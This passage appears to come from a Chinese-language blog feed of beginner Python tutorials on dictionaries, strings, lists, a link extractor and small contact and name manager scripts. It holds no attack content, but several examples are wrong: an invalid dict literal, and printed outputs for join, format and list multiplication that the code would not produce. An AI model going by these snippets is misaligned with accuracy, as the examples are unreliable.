#这里的执行方式是循环出每一个列表，然后从第一个列表对比，完成之后，再去对比下一个列表</span><br><span class="line">        for all_card in card_list:</span><br><span class="line">            if find_name == all_card[&apos;name&apos;]:</span><br><span class="line">                print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span class="line">                #做一个标记，表示找到了</span><br><span class="line">                find_flag = 0</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        if find_flag == 1:</span><br><span class="line">            print(&apos;该名片不存在！&apos;)</span><br><span class="line">        #更简单的方法，不用标记的方式，直接使用for else结合使用</span><br><span class="line">        # else:</span><br><span class="line">        #     print(&apos;该名片不存在！&apos;)</span><br><span class="line"></span><br><span class="line">    elif mun == 5:</span><br><span class="line">        #\t制表符，对齐作用</span><br><span class="line">        print(&apos;名字\t微信\t电话\t地址&apos;)</span><br><span class="line">        #从名片字典中循环出列表</span><br><span class="line">        for all_card in card_list:</span><br><span class="line">            print(&apos;%s\t%s\t%s\t%s&apos;%(all_card[&apos;name&apos;],all_card[&apos;contact&apos;],all_card[&apos;phone&apos;],all_card[&apos;address&apos;]))</span><br><span class="line"></span><br><span class="line">    elif mun == 6:</span><br><span class="line">        print(&apos;感谢使用本系统，再见！&apos;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    elif mun == 7:</span><br><span class="line">        mun = int(input(&apos;请再次输入数字7确认删库：&apos;))</span><br><span class="line">        if mun == 7:</span><br><span class="line">            card_list.clear()</span><br><span class="line">            print(&apos;已删除数据库！&apos;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&apos;请输入正确的功能序号！&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 字典</title>
      <link href="/article/python-dist.html"/>
      <url>/article/python-dist.html</url>
      
        <content type="html"><![CDATA[<p>Python字典 dictionary</p><p>字典是可变的数据类型，可以做原地修改，同样支持嵌套。<br>字典是无序的，是Python唯一的内置映射关系的数据类型，通过键找到它所对应的值。</p><p>{} 表示</p><p>key 必须是不可变的类型，如str 字符串 tuple 元祖<br>字典的键是唯一的，值不唯一</p><h3 id="创建字典："><a href="#创建字典：" class="headerlink" title="创建字典："></a>创建字典：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;&#123;&apos;a&apos;: &apos;aaa&apos;, &apos;s&apos;: &apos;sss&apos;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;a=&quot;aaa&quot;,s=&quot;sss&quot;&#125;</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;&#123;&apos;a&apos;: &apos;aaa&apos;, &apos;s&apos;: &apos;sss&apos;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">print c[&quot;a&quot;][&quot;id&quot;]</span><br><span class="line">&gt;&gt;12345</span><br></pre></td></tr></table></figure><h4 id="setdefault"><a href="#setdefault" class="headerlink" title="setdefault()"></a>setdefault()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#获取用户输入的名片信息，并赋值</span><br><span class="line">add_name = input(&apos;请输入姓名：&apos;)</span><br><span class="line">add_contact = input(&apos;请输入微信：&apos;)</span><br><span class="line">add_phone = input(&apos;请输入电话：&apos;)</span><br><span class="line">add_address = input(&apos;请输入地址：&apos;)</span><br><span class="line">#将获取的名片信息添加到字典中，字典 setdefault() 函数和get() 方法类似, 如果键不存在于字典中，将会添加键并将值设为默认值。</span><br><span class="line">#实现效果：[&#123;&apos;1&apos;: &#123;&apos;name&apos;: &apos;1&apos;, &apos;address&apos;: &apos;890&apos;, &apos;phone&apos;: &apos;567&apos;, &apos;contact&apos;: &apos;234&apos;&#125;&#125;]</span><br><span class="line">card = &#123;&#125;</span><br><span class="line">name = &apos;name&apos;</span><br><span class="line">contact = &apos;contact&apos;</span><br><span class="line">phone = &apos;phone&apos;</span><br><span class="line">address = &apos;address&apos;</span><br><span class="line">card.setdefault(add_name,&#123;&#125;)[name] = add_name</span><br><span class="line">card.setdefault(add_name,&#123;&#125;)[contact] = add_contact</span><br><span class="line">card.setdefault(add_name,&#123;&#125;)[phone] = add_phone</span><br><span class="line">card.setdefault(add_name,&#123;&#125;)[address] = add_address</span><br><span class="line">#把字典添加到列表中</span><br><span class="line">card_list.append(card)</span><br></pre></td></tr></table></figure><h3 id="添加字典："><a href="#添加字典：" class="headerlink" title="添加字典："></a>添加字典：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">c[&quot;c&quot;] = &#123;&quot;age&quot;:&quot;24&quot;,&quot;id&quot;:&quot;112233&quot;&#125;</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="列表嵌套的字典"><a href="#列表嵌套的字典" class="headerlink" title="列表嵌套的字典"></a>列表嵌套的字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure><h3 id="修改信息："><a href="#修改信息：" class="headerlink" title="修改信息："></a>修改信息：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">c[&quot;a&quot;][&quot;age&quot;] = &quot;88&quot;</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="update-方法："><a href="#update-方法：" class="headerlink" title="update()方法："></a>update()方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">c.update(&#123;&quot;d&quot;:&quot;ddd&quot;&#125;)</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;&#123;&apos;a&apos;: &apos;aaa&apos;, &apos;s&apos;: &apos;sss&apos;, &apos;d&apos;: &apos;ddd&apos;&#125;</span><br></pre></td></tr></table></figure><h3 id="字典删除操作："><a href="#字典删除操作：" class="headerlink" title="字典删除操作："></a>字典删除操作：</h3><p>clear() 方法：清空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">c.clear()</span><br></pre></td></tr></table></figure><h3 id="del-方法："><a href="#del-方法：" class="headerlink" title="del()方法："></a>del()方法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">del c[&quot;a&quot;]</span><br></pre></td></tr></table></figure><h3 id="del-c-删除字典"><a href="#del-c-删除字典" class="headerlink" title="del c 删除字典"></a>del c 删除字典</h3><p>pop() 删除字典内元素时，提示返回所对应的值，可以设置默认值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">c.pop(&quot;c&quot;,&quot;ccc&quot;)</span><br><span class="line">&gt;&gt;&apos;ccc&apos;</span><br></pre></td></tr></table></figure><h3 id="字典的成员关系："><a href="#字典的成员关系：" class="headerlink" title="字典的成员关系："></a>字典的成员关系：</h3><p>in/not in<br>true/false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">print &quot;a&quot; in c</span><br><span class="line">&gt;&gt;true</span><br></pre></td></tr></table></figure><h3 id="字典的其他方法："><a href="#字典的其他方法：" class="headerlink" title="字典的其他方法："></a>字典的其他方法：</h3><p>keys() 将字典的键以列表的形式呈现出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">print c.keys()</span><br><span class="line">&gt;&gt;[&apos;a&apos;, &apos;b&apos;]</span><br></pre></td></tr></table></figure><h3 id="values-将字典的值以列表的形式呈现出来："><a href="#values-将字典的值以列表的形式呈现出来：" class="headerlink" title="values() 将字典的值以列表的形式呈现出来："></a>values() 将字典的值以列表的形式呈现出来：</h3><p>items() 将字典中所有的项以列表的形式返回，每一项都是键和值这种组成关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&quot;aaa&quot;,&quot;s&quot;:&quot;sss&quot;&#125;</span><br><span class="line">print c.items()</span><br><span class="line">&gt;&gt;[(&apos;a&apos;, &apos;aaa&apos;), (&apos;s&apos;, &apos;sss&apos;)]</span><br></pre></td></tr></table></figure><h3 id="get-取字典中键所对应的值，参数为键名，如果键不存在，可以设置返回的信息："><a href="#get-取字典中键所对应的值，参数为键名，如果键不存在，可以设置返回的信息：" class="headerlink" title="get() 取字典中键所对应的值，参数为键名，如果键不存在，可以设置返回的信息："></a>get() 取字典中键所对应的值，参数为键名，如果键不存在，可以设置返回的信息：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">print c.get(&quot;c&quot;)</span><br><span class="line">&gt;&gt;None</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &#123;&quot;a&quot;:&#123;&quot;age&quot;:&quot;22&quot;,&quot;id&quot;:&quot;12345&quot;&#125;,&quot;b&quot;:&#123;&quot;age&quot;:&quot;23&quot;,&quot;id&quot;:&quot;67890&quot;&#125;&#125;</span><br><span class="line">print c.get(&quot;c&quot;,&quot;没有这个键值！&quot;)</span><br><span class="line">&gt;&gt;没有这个键值！</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 获取网页所有超链接</title>
      <link href="/article/refuse-get-links.html"/>
      <url>/article/refuse-get-links.html</url>
      
        <content type="html"><![CDATA[<p>附件下载：<br><a href="../do/code/getlinks.py">getlinks.py</a></p><p>这么执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py https://webing.io</span><br></pre></td></tr></table></figure><p>这是代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">url = sys.argv[1]</span><br><span class="line"></span><br><span class="line">def get_link(url):</span><br><span class="line">    html = urllib2.urlopen(url)</span><br><span class="line">    content = html.read()</span><br><span class="line">    html.close()</span><br><span class="line">    # links = re.findall(r&apos;(\w*\:\/\/[a-zA-Z0-9\.\-\_\/]+)&apos;, content)</span><br><span class="line">    links = re.findall(r&apos;(http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)&apos;, content)</span><br><span class="line">    for link in links:</span><br><span class="line">      print link</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    get_link(url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 列表实现名字管理</title>
      <link href="/article/python-list-application.html"/>
      <url>/article/python-list-application.html</url>
      
        <content type="html"><![CDATA[<p>功能如下：<br>获取用户输入的字符串：</p><ul><li>并判断是否为数字</li><li>并添加到列表中</li><li>判断字符串是否在列表中，存在则删除</li><li>判断字符串是否在列表中，存在则修改</li><li>判断字符串是否在列表中，存在则显示获取的字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">print (&apos;名字管理系统 1.0&apos;)</span><br><span class="line">print (&apos;功能菜单：&apos;)</span><br><span class="line">print (&apos;1.添加一个名字&apos;)</span><br><span class="line">print (&apos;2.删除一个名字&apos;)</span><br><span class="line">print (&apos;3.修改一个名字&apos;)</span><br><span class="line">print (&apos;4.查询一个名字&apos;)</span><br><span class="line">print (&apos;5.列出所有名字&apos;)</span><br><span class="line">print (&apos;6.退出系统&apos;)</span><br><span class="line">print (&apos;7.删库跑路&apos;)</span><br><span class="line"></span><br><span class="line">names = []</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    mun = input(&apos;请输入功能序号：&apos;)</span><br><span class="line">    if mun.isdigit():   #判断用户输入是否是数字</span><br><span class="line">        mun = int(mun)</span><br><span class="line">        </span><br><span class="line">    if mun == 1:</span><br><span class="line">        name = input(&apos;请输入需要添加的名字：&apos;)</span><br><span class="line">        names.append(name)</span><br><span class="line">        print (names)</span><br><span class="line"></span><br><span class="line">    elif mun == 2:</span><br><span class="line">        name = input(&apos;请输入需要删除的名字：&apos;)</span><br><span class="line">        if name in names:</span><br><span class="line">            names.remove(name)</span><br><span class="line">            print (names)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;操作失败，您输入的名字不存在！&apos;)</span><br><span class="line"></span><br><span class="line">    elif mun == 3:</span><br><span class="line">        name = input(&apos;请输入需要修改的名字：&apos;)</span><br><span class="line">        if name in names:</span><br><span class="line">            name_id = names.index(name)</span><br><span class="line">            name = input(&apos;请输入修改后名字：&apos;)</span><br><span class="line">            names[name_id] = name</span><br><span class="line">            print (names)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;操作失败，您输入的名字不存在！&apos;)</span><br><span class="line"></span><br><span class="line">    elif mun == 4:</span><br><span class="line">        name = input(&apos;请输入需要查询的名字：&apos;)</span><br><span class="line">        if name in names:</span><br><span class="line">            print (&apos;您要查询的名字：%s 此人存在！&apos;%name)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;您查找的名字：%s 此人不存在！&apos;%name)</span><br><span class="line"></span><br><span class="line">    elif mun == 5:</span><br><span class="line">        print (names)</span><br><span class="line"></span><br><span class="line">    elif mun == 6:</span><br><span class="line">        print(&apos;感谢使用本系统，欢迎下次再来！&apos;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    elif mun == 7:</span><br><span class="line">        del names[:]</span><br><span class="line">        print(&apos;已经删除所有数据，赶快跑路！&apos;)</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&apos;请输入正确的功能序号！&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 字符串</title>
      <link href="/article/python-string.html"/>
      <url>/article/python-string.html</url>
      
        <content type="html"><![CDATA[<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>任意多字符的集合。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>转义符：<br>换行：\n<br>原始字符串：r r”c:\n\1.txt”<br>多行字符串：三引号””” “””<br>len()：内置函数，用来查看对象的长度。<br>偏移量：print (len(a)-1) 最后一个字符</p><h3 id="字符串替换功"><a href="#字符串替换功" class="headerlink" title="字符串替换功"></a>字符串替换功</h3><p>变量.replace(“需要替换的字符”,”替换的内容”)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mystr = &apos;webing.io&apos;</span><br><span class="line">mystr.replace(&apos;web&apos;,&apos;www&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mystr = &apos;webing.io&apos;</span><br><span class="line">mystr.replace(&apos;web&apos;,&apos;www&apos;,1)</span><br><span class="line">#从左到右，只替换一个</span><br></pre></td></tr></table></figure><p>查看字符串的内置方法：<br>dir()：<br>查看内置方法的详细使用说明：<br>help(内置方法)<br>help(str) 查看所有字符串的内置方法</p><h3 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h3><p>变量.find(“查找的字符串”)<br>变量[索引词，查看索引词的位置]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mystr = &apos;webing.io&apos;</span><br><span class="line">mystr.find(&apos;web&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mystr = &apos;webing.io&apos;</span><br><span class="line">mystr.rfind(&apos;web&apos;)</span><br><span class="line">#从右边开始查找</span><br></pre></td></tr></table></figure><p>字符串拼接：</p><p>操作符：print a+b<br>% 占位操作符：<br>%s 字符串占位符<br>%d 数字占位符<br>%{} 字典占位符<br>“”.join([]) 内置字符串拼接<br>format() 内置方法格式化字符串</p><h3 id="s-字符串占位符"><a href="#s-字符串占位符" class="headerlink" title="%s 字符串占位符"></a>%s 字符串占位符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = &quot;what wheres %s&quot;</span><br><span class="line">b = why</span><br><span class="line">print a % b</span><br><span class="line">&gt;&gt;what wheres why</span><br><span class="line">print &quot;what wheres %s,what what %s&quot; % (&quot;why&quot;,&quot;?&quot;)</span><br><span class="line">&gt;&gt;what wheres why,what what ?</span><br></pre></td></tr></table></figure><h3 id="字典占位符：不受顺序限制，适合复杂字符串处理。"><a href="#字典占位符：不受顺序限制，适合复杂字符串处理。" class="headerlink" title="%{} 字典占位符：不受顺序限制，适合复杂字符串处理。"></a>%{} 字典占位符：不受顺序限制，适合复杂字符串处理。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print &quot;%(url)s crackcer %(cp)s&quot; % &#123;&quot;url&quot;:&quot;www&quot;,&quot;cp&quot;:&quot;com&quot;&#125;</span><br><span class="line">&gt;&gt;www crackcer com</span><br></pre></td></tr></table></figure><h3 id="“”-join-内置字符串拼接"><a href="#“”-join-内置字符串拼接" class="headerlink" title="“”.join([]) 内置字符串拼接"></a>“”.join([]) 内置字符串拼接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = web</span><br><span class="line">b = ing</span><br><span class="line">c = io</span><br><span class="line">print &quot;&quot;.join([a,b,c])</span><br><span class="line">&gt;&gt;web ing io</span><br></pre></td></tr></table></figure><p>在前边的引号填上.则输出：<br>webing.io</p><h3 id="format-内置方法格式化字符串"><a href="#format-内置方法格式化字符串" class="headerlink" title="format() 内置方法格式化字符串"></a>format() 内置方法格式化字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print &quot;&#123;0&#125;.crackcer.&#123;1&#125;&quot;.format(&quot;www&quot;,&quot;com&quot;)</span><br><span class="line">&gt;&gt;webing.io</span><br><span class="line">print &quot;&#123;a&#125;.crackcer.&#123;b&#125;&quot;.format(a = &quot;www&quot;,b = &quot;com&quot;)</span><br><span class="line">&gt;&gt;webing.io</span><br></pre></td></tr></table></figure><h3 id="详细资料"><a href="#详细资料" class="headerlink" title="详细资料"></a>详细资料</h3><p><a href="https://book.webing.io/05day/section.4.2.html" target="_blank" rel="noopener">字符串常见操作 | python基础语言</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 列表</title>
      <link href="/article/python-list.html"/>
      <url>/article/python-list.html</url>
      
        <content type="html"><![CDATA[<h3 id="列表概念"><a href="#列表概念" class="headerlink" title="列表概念"></a>列表概念</h3><p>列表是一个有序的集合，是一个Python非常重要的数据类型，列表是可变数据类型，可以做原地修改，并且它内部可以包含任何类型的对象。</p><h3 id="list-字符串转换列表"><a href="#list-字符串转换列表" class="headerlink" title="list() 字符串转换列表"></a>list() 字符串转换列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = &quot;abc&quot;</span><br><span class="line">print list(c)</span><br><span class="line">&gt;&gt;[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br></pre></td></tr></table></figure><p>列表可以包含任意字符串。</p><h3 id="len-计算长度"><a href="#len-计算长度" class="headerlink" title="len() 计算长度"></a>len() 计算长度</h3><p>len() 计算长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,4,5,&quot;asd&quot;]</span><br><span class="line">print len(c)</span><br><span class="line">&gt;&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3]</span><br><span class="line">d = [4,5,6]</span><br><span class="line">print c + d</span><br><span class="line">&gt;&gt;[1, 2, 3, 4, 5, 6]</span><br></pre></td></tr></table></figure><h3 id="乘号"><a href="#乘号" class="headerlink" title="乘号"></a>乘号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3]</span><br><span class="line">c * 2</span><br><span class="line">print c</span><br><span class="line">&gt;&gt;[1, 2, 3, 1, 2, 3]</span><br></pre></td></tr></table></figure><h3 id="索引取值"><a href="#索引取值" class="headerlink" title="索引取值"></a>索引取值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,4,5,[&quot;aa&quot;,&quot;bb&quot;],&quot;asd&quot;]</span><br><span class="line">print c[5][0]</span><br><span class="line">&gt;&gt;aa</span><br></pre></td></tr></table></figure><h3 id="列表是可变数据类型"><a href="#列表是可变数据类型" class="headerlink" title="列表是可变数据类型"></a>列表是可变数据类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,4,5,[&quot;aa&quot;,&quot;bb&quot;],&quot;asd&quot;]</span><br><span class="line">c[5] = 6</span><br><span class="line">&gt;&gt;[1, 2, 3, 4, 5, 6, &apos;asd&apos;]</span><br></pre></td></tr></table></figure><h3 id="切片高级应用"><a href="#切片高级应用" class="headerlink" title="切片高级应用"></a>切片高级应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,4,5,[&quot;aa&quot;,&quot;bb&quot;],&quot;asd&quot;]</span><br><span class="line">print c[0:3]</span><br><span class="line">&gt;&gt;[1, 2, 3]</span><br></pre></td></tr></table></figure><h3 id="步进"><a href="#步进" class="headerlink" title="步进"></a>步进</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [1,2,3,4,5,6,7]</span><br><span class="line">print c[1:6]</span><br><span class="line">&gt;&gt;[2, 3, 4, 5, 6]</span><br><span class="line">print c[1:6:2]</span><br><span class="line">&gt;&gt;[2, 4, 6]</span><br></pre></td></tr></table></figure><h3 id="append-列表的操作方法"><a href="#append-列表的操作方法" class="headerlink" title="append() 列表的操作方法"></a>append() 列表的操作方法</h3><p>append()追加，作用是在列表的结尾处，添加新的数据项，始源地修改了列表。<br>列表对象.对应的方法(传入的数据)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 